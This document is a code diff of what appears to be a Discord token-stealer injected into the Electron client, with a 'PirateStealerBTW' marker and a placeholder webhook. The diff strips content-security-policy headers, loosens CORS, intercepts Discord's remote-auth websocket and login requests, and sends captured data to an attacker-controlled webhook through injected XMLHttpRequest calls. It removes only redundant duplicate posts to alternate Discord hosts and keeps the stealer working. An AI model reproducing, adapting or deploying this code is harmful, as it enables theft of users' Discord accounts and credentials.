@@ -5,19 +5,9 @@ const https = require("https");
 const querystring = require('querystring');
 const electron = require('electron');
 
-electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
-    j.responseHeaders["Access-Control-Allow-Origin"] = '*';
-    if (!j.responseHeaders["content-security-policy-report-only"] && !j.responseHeaders["content-security-policy"]) return k({ cancel: false }); 
-    delete j.responseHeaders["content-security-policy-report-only"]; 
-    delete j.responseHeaders["content-security-policy"];
-    k({ cancel: false, responseHeaders: j.responseHeaders }); 
-  }); 
-
-
 
 
   var webhook = "%WEBHOOK_LINK%";
-  webhook = webhook.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
   function FirstTime(){
       
       if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))){
@@ -41,6 +31,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
       "wss://remote-auth-gateway.discord.gg/*"
       ]
   }
+
+  
+
   session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
           if (FirstTime())
           if (details.url.startsWith("wss://")){
@@ -51,65 +44,30 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
       callback({cancel:false})
   
   }})
-  
-  
+
+  session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+        delete details.responseHeaders['content-security-policy'];
+        delete details.responseHeaders['content-security-policy-report-only'];
+
+    callback({
+      responseHeaders: {
+        ...details.responseHeaders,       'Access-Control-Allow-Headers': "*"
+    }
+    })
+  })
+
+
   function SendToWebhook(what) {
     const window = BrowserWindow.getAllWindows()[0];
 
     window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "${webhook.replace("discord.", "discordapp.")}", true);
+    xhr.open("POST", "${webhook}", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${what}));
     `, true).then((token => {
 
-    }));
-
-    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "${webhook.replace("discordapp.", "discord.")}", true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xhr.send(JSON.stringify(${what}));
-    `, true).then((token => {
-
-    }));
-
-    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "${webhook.replace("discord.", "ptb.discord.")}", true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xhr.send(JSON.stringify(${what}));
-    `, true).then((token => {
-
-    }));
-
-    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "${webhook.replace("discord.", "ptb.discordapp.")}", true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xhr.send(JSON.stringify(${what}));
-    `, true).then((token => {
-
-    }));
-
-    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "${webhook.replace("discord.", "canary.discord.")}", true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xhr.send(JSON.stringify(${what}));
-    `, true).then((token => {
-
-    }));
-
-    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "${webhook.replace("discord.", "canary.discordapp.")}", true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xhr.send(JSON.stringify(${what}));
-    `, true).then((token => {
-
-    }));
-
+    }))
 
 
 
